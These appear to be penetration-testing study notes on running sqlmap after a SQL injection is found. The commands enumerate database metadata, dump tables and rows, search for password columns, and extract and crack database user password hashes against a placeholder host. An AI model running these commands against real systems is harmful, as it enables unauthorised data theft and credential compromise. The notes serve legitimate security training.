## 1- Database Enumeration
Enumeration is the main phase after confirming SQLi: retrieve DB metadata, tables, columns, and data for reporting or manual follow-up.

### SQLMap Data Exfiltration
SQLMap uses predefined queries per DBMS (data/xml/queries.xml). Non-blind (inband) queries extract whole results; blind queries retrieve data row-by-row.
#### Basic DB Data Enumeration
Common initial flags to gather basic info:
```bash
sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba
````
Retrieves banner (VERSION()), current user (CURRENT_USER()), current DB (DATABASE()), and DBA status (if current user is db admin).

#### Table Enumeration

List tables in a database:
```bash
sqlmap -u "http://www.example.com/?id=1" --tables -D testdb
```

Dump a specific table:
```bash
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb
```
Output is saved under ~/.local/share/sqlmap/output//dump/

#### Table/Row Enumeration

Limit columns or rows when dumping:
```bash
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb -C name,surname
```
Specify row range:
```bash
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --start=2 --stop=3
```
#### Conditional Enumeration
Use WHERE to filter rows:
```bash
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"
```
### Full DB Enumeration

Dump all tables in current DB:
```bash
sqlmap -u "http://www.example.com/?id=1" --dump -D testdb
```

Dump all databases (exclude system DBs):
```bash
sqlmap -u "http://www.example.com/?id=1" --dump-all --exclude-sysdbs
```



---

## 2Advanced Database Enumeration

more advanced techniques to enumerate data of interest further 

#### DB Schema Enumeration
Retrieve all DB tables structure
```bash
sqlmap -u "http://www.example.com/?id=1" --schema
```
### Searching for Data
Search for table names containing keyword
```bash
sqlmap -u "http://www.example.com/?id=1" --search -T user

# Search for column names containing keyword
sqlmap -u "http://www.example.com/?id=1" --search -C pass
```
### Password Enumeration and Cracking
Dump table containing passwords and try cracking
```bash
sqlmap -u "http://www.example.com/?id=1" --dump -D master -T users
```
### DB Users Password Enumeration and Cracking

Dump system DB credentials and crack hashes
```bash
sqlmap -u "http://www.example.com/?id=1" --passwords --batch
```
>The '--all' switch in combination with the '--batch' switch, will automa(g)ically do the whole enumeration process on the target itself, and provide the entire enumeration details.

